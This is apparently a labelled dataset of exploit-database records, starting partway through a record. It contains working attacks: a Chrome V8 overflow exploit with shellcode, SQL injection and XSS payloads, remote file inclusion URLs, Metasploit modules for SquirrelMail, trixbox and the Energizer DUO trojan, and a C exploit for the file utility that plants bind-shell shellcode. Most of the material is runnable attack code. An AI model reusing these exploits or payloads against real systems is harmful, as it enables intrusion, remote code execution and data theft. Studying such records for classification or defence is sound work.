         +---------------------+  The relevant code path for this issue is the packed double array case inside |Slow_ArrayConcat|. The method uses an unsigned variable for computing the result array length and caps it at |kMaxElementCount|[3], i.e., at 0xffffffff. Then the value of the variable gets converted to a *signed* type and passed to |NewFixedDoubleArray|[5] provided that the |fast_case| condition is satisfied[4], and the estimated array type is PACKED_DOUBLE. Thus, any value in the range [0x80000000, 0xffffffff] could pass the length check and trigger the overflow.  That still means an attacker has to make the method iterate through more than two billion array elements, which might seem implausible; actually, the whole process takes just a couple of seconds on a modern machine and has moderate memory requirements because multiple arguments can refer to the same array.  Also, |ArrayConcat| calls |Fast_ArrayConcat| in the beginning, and the fast method has a more strict length check, which might throw an error when the result length is more than |FixedDoubleArray:: kMaxLength|[7]. So, the attacker has to make |Fast_ArrayConcat| return early without triggering the error. The easiest way to achieve that is to define an additional property on the array.  REPRODUCTION CASE: <script> const MB = 1024 * 1024,       block_size = 32 * MB; array = Array(block_size).fill(1.1); array.prop = 1; args = Array(2048 * MB / block_size - 2).fill(array); args.push(Array(block_size)); array.concat.apply(array, args); </script>   2. Fill  The bug in |concat| allows writing data beyond the bounds of an array, but it's difficult to limit the size of the OOB data to a sane value, which makes the exploitation primitive less useful. So, I've spent some time looking for variants of the issue, and found one in |Array.prototype.fill|.  |ArrayPrototypeFill| initially obtains the length of an array[8] and uses that value to limit the |start| and |end| arguments. However, a later call to |GetRelativeIndex|[9] might trigger a user-defined JS function, which could modify the length. Usually, that's enough to cause OOB access, so |FastElementsAccessor::FillImpl| double-checks that the capacity of the array is not less than |end| and might call |GrowCapacityAndConvertImpl|[10], which in turn might call |NewFixedDoubleArray|. The issue here is that there's no check that |end| is small enough to fit in a signed type; therefore the same overflow leading to the allocation of an undersized backing store could occur.  REPRODUCTION CASE: <script> array = []; array.length = 0xffffffff;  b = array.fill(1.1, 0, {valueOf() {   array.length = 32;   array.fill(1.1);   return 0x80000000; }}); </script>   Exploitation: Unlike |concat|, |fill| conveniently allows limiting the size of the OOB block by modifying the |start| argument. The exploit forces the method to return an array whose length value is bigger than the actual size of the backing store, which is essentially a ready-to-use OOB read/write exploitation primitive. The rest is just copied from https://crbug.com/931640.  <script> let data_view = new DataView(new ArrayBuffer(8)); reverseDword = dword => {   data_view.setUint32(0, dword, true);   return data_view.getUint32(0, false); }  reverseQword = qword => {   data_view.setBigUint64(0, qword, true);   return data_view.getBigUint64(0, false); }  floatAsQword = float => {   data_view.setFloat64(0, float);   return data_view.getBigUint64(0); }  qwordAsFloat = qword => {   data_view.setBigUint64(0, qword);   return data_view.getFloat64(0); }  let oob_access_array; let ptr_leak_object; let arbirary_access_array; let ptr_leak_index; let external_ptr_index; let external_ptr_backup; const MARKER = 0x31337;  leakPtr = obj => {   ptr_leak_object[0] = obj;   return floatAsQword(oob_access_array[ptr_leak_index]); }  getQword = address => {   oob_access_array[external_ptr_index] = qwordAsFloat(address);   return arbirary_access_array[0];   oob_access_array[external_ptr_index] = external_ptr_backup; }  setQword = (address, value) => {   oob_access_array[external_ptr_index] = qwordAsFloat(address);   arbirary_access_array[0] = value;   oob_access_array[external_ptr_index] = external_ptr_backup; }  getField = (object_ptr, num, tagged = true) =>   object_ptr + BigInt(num * 8 - (tagged ? 1 : 0));  setBytes = (address, array) => {   for (let i = 0; i < array.length; ++i) {     setQword(address + BigInt(i), BigInt(array[i]));   } }  triggerOob = () => {   array = [];   array.length = 0xffffffff;   ptr_leak_object = {};   arbirary_access_array = new BigUint64Array(1);    oob_access_array = array.fill(1.1, 0x80000000 - 1, {valueOf() {     array.length = 32;     array.fill(1.1);     return 0x80000000;   }});   ptr_leak_object[0] = MARKER;   arbirary_access_array.buffer; }  findOffsets = () => {   let markerAsFloat = qwordAsFloat(BigInt(MARKER) << 32n);   for (ptr_leak_index = 0; ptr_leak_index < oob_access_array.length;       ++ptr_leak_index) {     if (oob_access_array[ptr_leak_index] === markerAsFloat) {       break;     }   }    let oneAsFloat = qwordAsFloat(1n << 32n);   for (external_ptr_index = 2; external_ptr_index < oob_access_array.length;       ++external_ptr_index) {     if (oob_access_array[external_ptr_index - 2] === oneAsFloat &&         oob_access_array[external_ptr_index - 1] === 0) {       break;     }   }    if (ptr_leak_index === oob_access_array.length ||       external_ptr_index === oob_access_array.length) {     throw alert(""Couldn't locate the offsets"");   }    external_ptr_backup = oob_access_array[external_ptr_index]; }  runCalc = () => {   const wasm_code = new Uint8Array([     0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,     0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,     0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,     0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,     0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,     0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,     0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,     0x00, 0x00, 0x41, 0x00, 0x0b   ]);   const wasm_instance = new WebAssembly.Instance(     new WebAssembly.Module(wasm_code));   const wasm_func = wasm_instance.exports.a;    const shellcode = [     0x48, 0x31, 0xf6, 0x56, 0x48, 0x8d, 0x3d, 0x32,     0x00, 0x00, 0x00, 0x57, 0x48, 0x89, 0xe2, 0x56,     0x48, 0x8d, 0x3d, 0x0c, 0x00, 0x00, 0x00, 0x57,     0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00, 0x00,     0x0f, 0x05, 0xcc, 0x2f, 0x75, 0x73, 0x72, 0x2f,     0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d,     0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c,     0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53,     0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00   ];    wasm_instance_ptr = leakPtr(wasm_instance);   const jump_table = getQword(getField(wasm_instance_ptr, 33));    setBytes(jump_table, shellcode);   wasm_func(); }  triggerOob(); findOffsets(); runCalc(); </script>   VERSION Google Chrome 72.0.3626.121 (Official Build) (64-bit) Google Chrome 74.0.3725.0 (Official Build) canary   I'd recommend changing |NewFixedDoubleArray| so it throws an OOM error on negative values, the same way as the similar |AllocateRawFixedArray| function currently does.",Integer Overflow VULNERABILITY,1
10760,Joomla! Component com_calendario - Blind SQL Injection Joomla Component com_calendario Blind SQL injection Vulnerability  author : Mr.tro0oqy --> yemeni hacker  email : t.4@windowslive.com  dork: inurl:index.php?option=com_calendario   exp :  http://www.target.com/index.php?option=com_calendario&task=detalhes&Itemid=88&id=297+and+1=1 true   http://www.target.com/index.php?option=com_calendario&task=detalhes&Itemid=88&id=297+and+1=0 false   enjoy ;),Blind SQL Injection,1
6896,"Logz podcast CMS 1.3.1 - 'art' SQL Injection [~] Logz podcast CMS version 1.3.1 Remote sql inj [~] [~] download: http://sourceforge.net/project/showfiles.php?group_id=107225&package_id=178479&release_id=635701 [~] [~] ---------------------------------------------------------- [~] Discovered By: ZoRLu [~] [~] Date: 31.10.2008 [~] [~] Home: www.z0rlu.blogspot.com [~] [~] contact: trt-turk@hotmail.com [~] [~] N0T: YALNIZLIK, YiTiRDi ANLAMINI YALNIZLIGIMDA : ( ( [~]  [~] N0T: a.q kpss : ) ) [~] [~] -----------------------------------------------------------  file:  fichiers/add_url.php  code:         if (isset($_GET['art'])) { 	      $Article = $_GET['art'];  	       	      ... 	       	      $Requete = ""SELECT TITRE FROM "".TABLEARTICLES."" WHERE ID = '"".$Article.""' "".$Conditions;         $ResultRequete = requete_mysql($Requete); 	       	     Exploit:  http://localhost/script_path/fichiers/add_url.php?art=[SQL]  [SQL]= column number 1 (SELECT TITRE FROM ...)  1'+union+select+concat(user(),0x3a,database())/*  example:  http://example.com/scripth_path/fichiers/add_url.php?art=1'+union+select+concat(user(),0x3a,database())/*  [~]---------------------------------------------------------------------- [~] Greetz tO: str0ke & all Muslim HaCkeRs [~] [~] yildirimordulari.org  &  darkc0de.com [~] [~]----------------------------------------------------------------------  # milw0rm.com [2008-10-31]",SQL Injection,1
16888,"SquirrelMail PGP Plugin - Command Execution (SMTP) (Metasploit) ## # $Id: squirrelmail_pgp_plugin.rb 10148 2010-08-25 20:31:46Z egypt $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ManualRanking  	# 	# This module sends email messages via smtp 	# 	include Msf::Exploit::Remote::SMTPDeliver  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'SquirrelMail PGP Plugin command execution (SMTP)', 			'Description'    => %q{ 					This module exploits a command execution vulnerability in the 				PGP plugin of SquirrelMail. This flaw was found while quickly 				grepping the code after release of some information at 				http://www.wslabi.com/. Later, iDefense published an advisory ....  				Reading an email in SquirrelMail with the PGP plugin activated 				is enough to compromise the underlying server.  				Only ""cmd/unix/generic"" payloads were tested. 			}, 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 10148 $', 			'Author'         => [ 'Nicob <nicob[at]nicob.net>' ], 			'References'     => 				[ 					['CVE', '2003-0990'], 					['OSVDB', '3178'], 					['URL', 'http://lists.immunitysec.com/pipermail/dailydave/2007-July/004456.html'], 					['URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=330'], 					['URL', 'http://www.wslabi.com/wabisabilabi/initPublishedBid.do?'], 				], 			'Stance'         => Msf::Exploit::Stance::Passive, 			'Platform'       => 'unix', 			'Arch'           => ARCH_CMD, 			'Payload'        => 				{ 					'Space'       => 1024, 					'BadChars'    => '', 					'Compat'      => 						{ 							'PayloadType' => 'cmd', 							'RequiredCmd' => 'generic perl ruby bash telnet', 						} 				}, 			'Targets'        => 				[ 					[ 'SquirrelMail PGP plugin < 2.1', {} ], 				], 			'DisclosureDate' => 'Jul 9 2007', 			'DefaultTarget' => 0))  	end  	def mime_defaults() 		self.header.set(""MIME-Version"", ""1.0"") 		self.header.set(""Content-Type"", ""multipart/signed; boundary=\""#{self.bound}\""; protocol=\""application/pgp-signature\""; micalg=pgp-sha1"") 		self.header.set(""Subject"", '') # placeholder 		self.header.set(""Date"", Time.now.strftime(""%a,%e %b %Y %H:%M:%S %z"")) 		self.header.set(""Message-ID"", 			""<""+ 			Rex::Text.rand_text_alphanumeric(rand(20)+40)+ 			""@""+ 			Rex::Text.rand_text_alpha(rand(20)+3)+ 			"">"" 			) 		self.header.set(""From"", '')    # placeholder 		self.header.set(""To"", '')      # placeholder 	end  	def exploit  		body = 			# Display some junk 			rand_text_alphanumeric(rand(128)+16) + ""\n"" + 			rand_text_alphanumeric(rand(128)+16) + ""\n"" + 			rand_text_alphanumeric(rand(128)+16) + ""\n"" + 			rand_text_alphanumeric(rand(128)+16) + ""\n"" + 			rand_text_alphanumeric(rand(128)+16) + ""\n"" + 			rand_text_alphanumeric(rand(128)+16) + ""\n"" +  			# Scroll down 			""\n"" * (rand(100)+35) +  			# Escape filter and insert payload 			""AAAA\\\"";"" + payload.encoded + "";echo \\\""BBBBB\n""  		sig = 			""-----BEGIN PGP SIGNATURE-----\nVersion: GnuPG\n\n "" + 			rand_text_alphanumeric(rand(20)+54) + ""\n"" + 			rand_text_alphanumeric(rand(20)+34) + ""\n"" + 			""-----END PGP SIGNATURE-----\n""  		msg = Rex::MIME::Message.new 		msg.extend(MessageExtend) 		msg.mime_defaults 		msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1) 		msg.to = datastore['MAILTO'] 		msg.from = datastore['MAILFROM']  		msg.add_part(body, ""text/plain;charset=us-ascii;format=flowed"", ""quoted-printable"", nil) 		msg.add_part(sig, ""application/pgp-signature"", nil, ""attachment; filename=signature.asc"")  		send_message(msg.to_s)  		print_status(""Waiting for a payload session (backgrounding)..."") 	end  end",Command Execution,1
19418,"IBM AIX 4.3.1 - 'adb' Denial of Service source: https://www.securityfocus.com/bid/520/info  adb is the debugger that ships with IBM's AIX operating system. It is possible for a local user to cause a local denial of service through exploiting the version of adb shipped with AIX 4.2 through 4.3.1. The consequence of adb being exploited is the machine being halted by a malicious local user.   gcc -g -o a.out hello-world.c $ adb a.out - adb .main,5:s a.out: running",Denial of Service,1
7341,"lcxbbportal 0.1 alpha 2 - Remote File Inclusion =============================================================================================================     [o] lcxBBportal 0.1 Alpha 2 Remote File Inclusion Vulnerability         Software : lcxBBportal version 0.1 Alpha 2        Vendor   : http://code.google.com/p/lcxbbportal/        Download : http://code.google.com/p/lcxbbportal/downloads/list/lcxbbportal-0.1.A2.tar.gz        Author   : NoGe        Contact  : noge[dot]code[at]gmail[dot]com        Blog     : http://evilc0de.blogspot.com   =============================================================================================================     [o] Vulnerable file         portal/includes/portal_block.php  	include($phpbb_root_path . 'includes/bbcode.' . $phpEx);         includes/acp/acp_lcxbbportal.php  	$phpbb_portal_path = $phpbb_root_path . 'portal/'; 	require_once($phpbb_portal_path . 'includes/portal_block.' . $phpEx); 	require_once($phpbb_portal_path . 'includes/adm_portal_block.' . $phpEx); 	include($phpbb_root_path . 'includes/functions_display.' . $phpEx);      [o] Exploit         http://localhost/[path]/portal/includes/portal_block.php?phpbb_root_path=[evilcode]        http://localhost/[path]/includes/acp/acp_lcxbbportal.php?phpbb_root_path=[evilcode]   =============================================================================================================     [o] Greetz         MainHack BrotherHood [ http://serverisdown.org/blog/]        Vrs-hCk OoN_BoY Paman bL4Ck_3n91n3 loqsa        H312Y yooogy mousekill }^-^{ kaka11 martfella        skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke         GANYANG MALINGSIAL!!! [ http://malingsial.serverisdown.org/ ]           =============================================================================================================  # milw0rm.com [2008-12-04]",Remote File Inclusion,1
46612,"SJS Simple Job Script - SQL Injection / Cross-Site Scripting # Exploit Title: Simple Job Script - Multiple Vulnerabilities # Date: 26.03.2019 # Exploit Author: Ahmet Ümit BAYRAM # Vendor Homepage: https://simplejobscript.com/ # Download Link: https://github.com/niteosoft/simplejobscript/archive/master.zip # Demo Site: https://demo.simplejobscript.com # Version: Lastest # Tested on: Kali Linux # CVE: N/A  ----- PoC 1: SQLi -----  Request: http://localhost/[PATH]/searched Vulnerable Parameter: landing_location (POST) Payload: landing_location=-1%20OR%203*2*1=6%20AND%20000405=000405%20--%20&landing_title=test    ----- PoC 2: SQLi -----  Request: http://localhost/[PATH]/get_job_applications_ajax.php Vulnerable Parameter: job_id (POST) Payload: job_id=-1%20OR%203*2*1=6%20AND%20000615=000615%20--%20   ----- PoC 3: SQLi -----  Request: http://localhost/[PATH]/register-recruiters Vulnerable Parameter: employerid (POST) Payload: if(now()=sysdate(),sleep(0),0)   ----- PoC 4: SQLi -----  Request: http://localhost/[PATH]/delete_application_ajax.php Vulnerable Parameter: app_id (POST) Payload: app_id=(select(0)from(select(sleep(0)))v)/*'%2B(select(0)from(select(sleep(0)))v)%2B'""%2B(select(0)from(select(sleep(0)))v)%2B""*/   ----- PoC 5: XSS -----  Request: http://localhost/[PATH]/jobs?_=1&job_type_value[]=Full%20time&srch_location_val[]=fulltime_ctype Vulnerable Parameter: job_type_value[] (GET) Payload: ""><svg+onload%3Dalert(document.cookie)>",Cross-Site Scripting,1
16390,"Arugizer Trojan Horse (Energizer DUO) - Code Execution (Metasploit) ## # $Id: energizer_duo_payload.rb 10389 2010-09-20 04:38:13Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::EXE  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Energizer DUO Trojan Code Execution', 			'Description'    => %q{ 					This module will execute an arbitrary payload against 				any system infected with the Arugizer trojan horse. This 				backdoor was shipped with the software package accompanying 				the Energizer Duo USB battery charger. 			}, 			'Author'         => [ 'hdm' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 10389 $', 			'References'     => 				[ 					['CVE', '2010-0103'], 					['OSVDB', '62782'], 					['US-CERT-VU', '154421'] 				], 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Automatic', { } ], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Mar 05 2010' 			))   		register_options( 			[ 				Opt::RPORT(7777), 			], self.class) 	end  	def trojan_encode(str) 		str.unpack(""C*"").map{|c| c ^ 0xE5}.pack(""C*"") 	end  	def trojan_command(cmd) 		cid = """"  		case cmd 		when :exec 			cid = ""{8AF1C164-EBD6-4b2b-BC1F-64674E98A710}"" 		when :dir 			cid = ""{0174D2FC-7CB6-4a22-87C7-7BB72A32F19F}"" 		when :write 			cid = ""{98D958FC-D0A2-4f1c-B841-232AB357E7C8}"" 		when :read 			cid = ""{F6C43E1A-1551-4000-A483-C361969AEC41}"" 		when :nop 			cid = ""{783EACBF-EF8B-498e-A059-F0B5BD12641E}"" 		when :find 			cid = ""{EA7A2EB7-1E49-4d5f-B4D8-D6645B7440E3}"" 		when :yes 			cid = ""{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}"" 		when :runonce 			cid = ""{384EBE2C-F9EA-4f6b-94EF-C9D2DA58FD13}"" 		when :delete 			cid = ""{4F4F0D88-E715-4b1f-B311-61E530C2C8FC}"" 		end  		trojan_encode( 			[cid.length + 1].pack(""V"") + cid  + ""\x00"" 		) 	end  	def exploit  		nam = ""C:\\"" + Rex::Text.rand_text_alphanumeric(12) + "".exe"" + ""\x00"" 		exe = generate_payload_exe + ""\x00""   		print_status(""Trying to upload #{nam}..."") 		connect  		# Write file request 		sock.put(trojan_command(:write)) 		sock.put(trojan_encode([nam.length].pack(""V""))) 		sock.put(trojan_encode(nam)) 		sock.put(trojan_encode([exe.length].pack(""V""))) 		sock.put(trojan_encode(exe))  		# Required to prevent the server from spinning a loop 		sock.put(trojan_command(:nop))  		disconnect  		# 		# Execute the payload 		#  		print_status(""Trying to execute #{nam}..."")  		connect  		# Execute file request 		sock.put(trojan_command(:exec)) 		sock.put(trojan_encode([nam.length].pack(""V""))) 		sock.put(trojan_encode(nam))  		# Required to prevent the server from spinning a loop 		sock.put(trojan_command(:nop))  		disconnect 	end end",Code Execution,1
17919,"Banana Dance CMS and Wiki - SQL Injection +-----------------------+ | Banana Dance CMS+Wiki | +-----------------------+    Vulnerable Web-App : Banana Dance CMS+Wiki Vulnerability      : SQLi Author             : Aodrulez.  Email              : f3arm3d3ar@gmail.com Google-Dork        : :) Guess it. Tested on          : Ubuntu 10.04 Web-App            : http://www.doyoubananadance.com/ Download Link      : http://www.doyoubananadance.com/functions/dl.php?file=4e84e50f89bf7     +---------+ | Details | +---------+  1] SQLi  Exploit : http://localhost/user.php?id=1'[sqli]  Error: ------ Invalid query: SELECT `key`,`value` FROM `bd_user_data` WHERE `user_id`='1'' Error: You have an error in your SQL syntax; check the manual  that corresponds to your MySQL server version for the right  syntax to use near ''1''' at line 1    +----------+ |  MalCon  | +----------+ (International Malware Conference)  The CFP for MalCon-2011 is ON! If you think you are good enough, try cracking our 'Capture the Mal Challenge-2011' online. Open to everyone!  For more details, visit http://malcon.org     +-------------------+ | Greetz Fly Out To | +-------------------+        1] Amforked()          : My Mentor. 2] The Blue Genius     : My Boss. 3] str0ke (milw0rm) 4] www.orchidseven.com 5] www.malcon.org 6] www.isac.org.in 7] www.nsd.org.in 8] LiquidWorm   +-------+ | Quote | +-------+   ""Microsoft is not the answer. Microsoft is the question. NO is the answer.""   - Erik Naggum",SQL Injection,1
22326,"File 3.x - Utility Local Memory Allocation // source: https://www.securityfocus.com/bid/7009/info  It has been reported that a memory allocation issue exists the file program. Although details of this issue are currently unavailable, it is likely that this issue could be exploited to cause a denial of service condition, and potentially execute code as the user of the file utility.   /* \   __________________ /   Black Sand Project \   __________________ / \   Created by CrZ [crazy_einstein@yahoo.com] LimpidByte [lbyte.void.ru] /06.03.2003/ / \   Bug discovered by iDEFENCE: http://www.idefense.com/advisory/03.04.03.txt /    \   program name: DEADELF / \   description: Exploit for file program <= 3.39 / \   info: program create file-exploit and when you  /   make ""file /path/to/this/file-exploit"" shell \   will open on 2003 port. / \   Usage: ./85deadelf <file-exploit> [return address] / \   Example of work: / \	[crz@blacksand crz]$ gcc -o 85deadelf 85deadelf.c /	[crz@blacksand crz]$ ./85deadelf deadelf \	[+] Creating a evil file deadelf! /	[+] Using address of shellcode = 0xbfffbd40 \	[crz@blacksand crz]$ file deadelf /	File: ASCII text \	[crz@blacksand crz]$ telnet localhost 2003 /	Trying 127.0.0.1... \	Connected to blacksand (127.0.0.1). /	Escape character is '^]'. \	id; /	uid=500(crz) gid=500(crz) groups=500(crz) \	: command not found /	exit; \	Connection closed by foreign host. /	[crz@blacksand crz]$ \ /   Tested against: file-3.37 (RedHat8.0) \		    file-3.38 (RedHat8.0) */   #include <fcntl.h> #include <elf.h> #include <stdio.h>   void usage(char *prog) {  	printf(""\nCreated by CrZ [crazy_einstein@yahoo.com] Limpid Byte [lbyte.void.ru]\n""); 	printf(""Usage: %s <name of evil file> [return address]\n\n"",prog); 	exit(0); }  int main(int argc, char **argv) { 	 /*  \   a simple shellcode that show fake result of file program & bind /   shell on 2003 port by CrZ */ 	 char shellcode[]= 	""\x31\xc0\x31\xdb\x53\xb3\x01\x50"" /* write(1,""File: ASCII text"");*/ 	""\x68\x01\x01\x0a\x0d\x68\x74\x65"" 	""\x78\x74\x68\x43\x49\x49\x20\x68"" 	""\x3a\x20\x41\x53\x68\x46\x69\x6c"" 	""\x65\x89\xe1\xb2\x18\xb0\x04\xcd\x80""         /* bind shell on 2003 port */         ""\x31\xc0\x89\xc3\xb0\x02\xcd\x80\x38\xc3\x74\x05\x8d\x43\x01\xcd\x80""         ""\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d""         ""\x08\xb0\x66\xcd\x80\x89\x45\x08\x43\x66\x89\x5d\x14\x66\xc7\x45\x16""         ""\x07\xd3\x31\xd2\x89\x55\x18\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10""         ""\xb0\x66\xcd\x80\x40\x89\x45\x0c\x43\x43\xb0\x66\xcd\x80\x43\x89\x45""         ""\x0c\x89\x45\x10\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41""         ""\x80\xf9\x03\x75\xf6\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62""         ""\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80""; 	 	int fd,i; 	Elf32_Ehdr elfhdr; 	long xret=0xbfffbd40; 	char *evilfile=""bl00mps""; 	char tmp[100]; 	 	if(!argv[1]) usage(argv[0]); 	else evilfile=argv[1]; 	if(argv[2]) sscanf(argv[2],""0x%x"",&xret); 	 	printf(""[+] Creating a evil file %s!\n"",evilfile); 	printf(""[+] Using address of shellcode = 0x%x\n"",xret);	 	 	sprintf(tmp,""echo>%s"",evilfile); 	system(tmp); 	fd=open(evilfile,O_WRONLY);  	bzero(&elfhdr,sizeof elfhdr ); 	elfhdr.e_type=1; //type should by NOT ET_CORE (4) & NOT ET_EXEC (2) 	sprintf(elfhdr.e_ident,""\x7f\x45\x4c\x46\x01\x01\x01""); //ELF32 FORMAT 	elfhdr.e_machine=1; 	elfhdr.e_version=1; 	elfhdr.e_entry=0; 	elfhdr.e_phoff=0; 	elfhdr.e_shoff=0; 	elfhdr.e_flags=0; 	elfhdr.e_ehsize=0; 	elfhdr.e_phentsize=0xfff; //define size for read() 	elfhdr.e_phnum=1; //this is for stop for() loop when read() 	elfhdr.e_shentsize=0xfff; //define size for read() 	elfhdr.e_shnum=1; //this is for stop for() loop when read() 	elfhdr.e_shstrndx=0; 	write(fd,&elfhdr,sizeof(elfhdr)); 	 	for(i=0;i<20;i++) write(fd,&xret,4); //write new return address 	for(i=0;i<6000;i++) write(fd,""\x90"",1); //write nops 	write(fd,&shellcode,sizeof shellcode); //write shellcode  	close(fd);  	 	return 0;	 }",Utility Local Memory Allocation,1
16904,"Fonality trixbox CE 2.6.1 - 'langChoice' Local File Inclusion (Metasploit) ## # $Id: trixbox_langchoice.rb 11516 2011-01-08 01:13:26Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  # -*- coding: utf-8 -*- require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ManualRanking  	PHPSESSID_REGEX = /(?:^|;?)PHPSESSID=(\w+)(?:;|$)/  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'        => 'Trixbox langChoice PHP Local File Inclusion', 			'Description' => %q{ 					This module injects php into the trixbox session file and then, in a second call, evaluates 				that code by manipulating the langChoice parameter as described in OSVDB-50421. 			}, 			'Author'      => ['chao-mu'], 			'License'     => BSD_LICENSE, 			'Version'     => '$Revision: 11516 $', 			'References'  => 				[ 					['OSVDB'   => '50421'], 					['CVE'     => '2008-6825'], 					['BID'     => '30135'], 					['URL'     => 'http://www.exploit-db.com/exploits/6026/'], 					['URL'     => 'http://www.trixbox.org/'] 				], 			'Payload'     => 				{ 					# max header length for Apache (8190), 					# http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize 					# minus 23 for good luck (and extra spacing) 					'Space'       => 8190 - 23, 					'DisableNops' => true, 					'Compat'      => 						{ 							'ConnectionType' => 'find', 						}, 					'BadChars'    => ""'\""`""  # quotes are escaped by PHP's magic_quotes_gpc in a default install 				}, 			'Targets'        => [['trixbox CE 2.6.1', {}]], 			'DefaultTarget'  => 0, 			'Platform'       => 'php', 			'Arch'           => ARCH_PHP, 			'DisclosureDate' => 'Jul 09 2008' 		))  		register_options( 			[ 				OptString.new('URI',  [true, 'The uri that accepts the langChoice param', '/user/index.php']), 				OptString.new('PATH', [true, 'The path where the php was stored', '../../../../../../../../../../tmp/sess_!SESSIONID!%00']), 			], self.class) 	end  	def check 		# We need to ensure that this can be reached via POST 		uri = datastore['URI'] 		target_code = 200  		print_status ""Attempting to POST to #{uri}"" 		response = send_request_cgi({'uri' => uri, 'method' => 'POST'})  		unless defined? response 			print_error 'Server did not respond to HTTP POST request' 			return Exploit::CheckCode::Safe 		end  		code = response.code  		unless code == target_code 			print_error ""Expected HTTP code #{target_code}, but got #{code}."" 			return Exploit::CheckCode::Safe 		end  		print_status ""We received the expected HTTP code #{target_code}""  		# We will need the cookie PHPSESSID to continue 		cookies = response.headers['Set-Cookie']  		# Make sure cookies were set 		if defined? cookies and cookies =~ PHPSESSID_REGEX 			print_status ""We were successfully sent a PHPSESSID of '#{$1}'"" 		else 			print_error 'The server did not send us the cookie we were looking for' 			return Exploit::CheckCode::Safe 		end  		# Okay, at this point we're just being silly and hackish. 		unless response.body =~ /langChoice/ 			print_error 'The page does not appear to contain a langChoice field' 			return Exploit::CheckCode::Safe 		end  		# XXX: Looking for a good way of determine if it is NOT trixbox 		# unless response.body.match(/trixbox - User Mode/) 		# 	print_status 'The target does not appear to be running trixbox' 		# 	return Exploit::CheckCode::Safe 		# end 		# print_status 'The target appears to be running trixbox'  		# If it has the target footer, we know its vulnerable 		# however skining may mean the reverse is not true 		# We've only tested on v2.6.1, so that is all we will guarantee 		# Example footer: v2.6.1 ©2008 Fonality #		if response.body =~ /(v2\.(?:[0-5]\.\d|6\.[0-1]))\s{2}&copy;200[0-8] Fonality/ 		if response.body =~ /(v2\.6\.1)\s{2}&copy;2008 Fonality/ 			print_status ""Trixbox #{$1} detected!"" 			return Exploit::CheckCode::Vulnerable 		end  		print_status 'The target may be skinned making detection too difficult'  		if response.body =~ /trixbox - User Mode/ 			return Exploit::CheckCode::Detected 		else 			return Exploit::CheckCode::Unknown 		end 	end  	def exploit 		# We will be be passing this our langChoice values 		uri = datastore['URI']  		# Prepare PHP file contents 		encoded_php_file = Rex::Text.uri_encode(""<?php #{payload.encoded} ?>"")  		# Deliver the payload 		print_status('Uploading the payload to the remote server') 		delivery_response = send_request_cgi({ 				'uri'    => uri, 				'method' => 'POST', 				'data'   => ""langChoice=#{encoded_php_file}%00"" 			})  		# The call should return status code 200 		if delivery_response.code != 200 			raise RuntimeError, ""Server returned unexpected HTTP code #{delivery_response.code}"" 		end  		print_status ""The server responded to POST with HTTP code #{delivery_response.code}""  		# We will need the cookie PHPSESSID to continue 		cookies = delivery_response.headers['Set-Cookie']  		# Make sure cookies were set 		if cookies.nil? 			raise RuntimeError, 'The server did not set any cookies' 		end  		# Contents of PHPSESSID. About to be set. 		session_id = nil  		# Retrieve the session id from PHPSESSID 		if cookies =~ PHPSESSID_REGEX 			session_id = $1 		else 			raise RuntimeError, 'The cookie PHPSESSID was not set.' 		end  		print_status ""We were assigned a session id (cookie PHPSESSID) of '#{session_id}'""  		# Prepare the value that will execute our payload 		detonation = datastore['PATH'].sub('!SESSIONID!', session_id)  		print_status ""We will use '#{detonation}' as the value of langChoice to detonate the payload""  		# Request the detonation uri, detonating the payload 		print_status 'Attempting to detonate. You will need to clean /tmp/ yourself.'  		# Small timeout as we're just going to assume we succeeded. 		send_request_cgi({ 				'uri' => uri, 				'cookie' => cookies, 				'method' => 'POST', 				'data' => ""langChoice=#{detonation}%00"" 			}, 0.01)  		handler 	end end",Local File Inclusion,1
